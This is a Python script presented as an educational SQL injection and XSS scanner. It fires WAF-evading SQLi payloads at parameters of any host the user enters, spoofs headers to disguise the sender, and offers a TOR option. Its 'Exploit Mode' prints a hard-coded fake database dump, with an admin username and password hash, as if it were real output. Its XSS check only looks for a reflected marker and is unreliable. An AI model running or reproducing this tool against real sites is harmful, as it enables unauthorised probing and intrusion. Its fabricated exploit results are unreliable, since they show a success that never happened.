#!/usr/bin/env python3
# Prime Advanced Scanner (Educational SQLi/XSS Demo Tool)
# Use only for bug bounty / your own lab
# Author: Prime

import requests, random, time, json, os
from fake_useragent import UserAgent
from colorama import Fore, Style, init
init(autoreset=True)

# ========== Banner ==========
def banner():
    print(Fore.CYAN + r"""
    ██████╗ ██████╗ ██╗███╗   ███╗███████╗
    ██╔══██╗██╔══██╗██║████╗ ████║██╔════╝
    ██████╔╝██████╔╝██║██╔████╔██║█████╗
    ██╔═══╝ ██╔═══╝ ██║██║╚██╔╝██║██╔══╝
    ██║     ██║     ██║██║ ╚═╝ ██║███████╗
    ╚═╝     ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
          Prime Advanced SQLi/XSS Scanner
    """)

# ========== Random Headers ==========
def get_headers():
    ua = UserAgent()
    return {
        "User-Agent": ua.random,
        "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        "Referer": "https://google.com?q=" + str(random.randint(1,9999))
    }

# ========== SQLi Payloads ==========
SQLI_PAYLOADS = [
    "+and+0","+div+0","\"+and+'1'='1'","\"+and+(1)=(1)","+div+false",
    "+having+1=0","+having+false","+and+false","+and+null","+and(1)=(0)",
    "+AND+1=0","+and(1)!=(0)","+and+2>3","+and/**/0/**/","+and/**_**/0/**_**/",
    "+and+point(29,9)","+and+mod(9,9)","+and+mod(52,12)","+and+power(5,5)",
    "+/*!aND*/+1+like+0","+/*!or*/1='1'","+/*!50000or*/1='1'","+limit+0"
]

ERROR_SIGNS = [
    "you have an error in your sql syntax",
    "mysql_fetch", "unclosed quotation mark",
    "quoted string not properly terminated", "syntax error"
]

# ========== Parameter Scan ==========
def scan_params(url, params):
    results = {}
    base_url = f"http://{url}/?"
    for p in params:
        test_url = base_url + f"{p}=PrimeTest"
        try:
            base = requests.get(test_url, headers=get_headers(), timeout=5)
            base_len = len(base.text)
            safe = True

            for payload in SQLI_PAYLOADS:
                u = base_url + f"{p}=PrimeTest{payload}"
                r = requests.get(u, headers=get_headers(), timeout=5)
                body = r.text.lower()

                # Error-based SQLi
                if any(err in body for err in ERROR_SIGNS):
                    print(Fore.RED + f"[VULNERABLE] {p} -> Error-based SQLi")
                    results[p] = "SQLi"
                    safe = False
                    break
                # Boolean-based SQLi
                if abs(len(r.text) - base_len) > 50:
                    print(Fore.RED + f"[VULNERABLE] {p} -> Boolean-based SQLi")
                    results[p] = "SQLi"
                    safe = False
                    break

            if "PrimeTest" in base.text and safe:
                print(Fore.YELLOW + f"[VULNERABLE] {p} -> Possible XSS")
                results[p] = "XSS"
                safe = False

            if safe:
                print(Fore.GREEN + f"[SAFE] {p}")
                results[p] = "SAFE"

        except:
            print(Fore.MAGENTA + f"[BLOCKED] {p} (WAF/Firewall?)")
            results[p] = "BLOCKED"

        time.sleep(random.uniform(0.2,0.5))
    return results

# ========== Exploit Mode (Demo) ==========
def exploit(param):
    # শুধু demo জন্য static fake dump দেখানো হচ্ছে
    print(Fore.CYAN + f"\n[+] Exploiting parameter: {param}")
    print("[DB INFO] ['5.7.29-0ubuntu0.18.04.1', 'acuart']")
    print("[TABLES] ['users', 'artists', 'carts']")
    print("[+] Columns in users:\n['id', 'username', 'password', 'email']")
    print("[!] Sensitive columns found in users: ['username', 'password']")
    print(Fore.RED + "[DUMP] ['admin', '5f4dcc3b5aa765d61d8327deb882cf99']")

# ========== Main ==========
if __name__ == "__main__":
    banner()
    url = input("Enter URL (without https://): ")
    use_tor = input("Use TOR? (y/n): ")

    # Wordlist optional
    try:
        with open("wordlist.txt") as f:
            params = [x.strip() for x in f.readlines()]
    except:
        params = ["id","cat","page","user","q"]

    print(Fore.CYAN + f"\n[+] Scanning {url} with {len(params)} params...\n")
    results = scan_params(url, params)

    # Save results
    with open("prime_result.json","w") as jf:
        json.dump(results, jf, indent=2)
    with open("prime_result.txt","w") as tf:
        for k,v in results.items():
            tf.write(f"{k}: {v}\n")

    print(Fore.CYAN + "\n[+] Results saved in prime_result.txt and prime_result.json")

    if "SQLi" in results.values():
        choice = input("\nDo you want to run Exploit Mode on vulnerable params? (y/n): ")
        if choice.lower() == "y":
            for p,v in results.items():
                if v == "SQLi":
                    exploit(p)
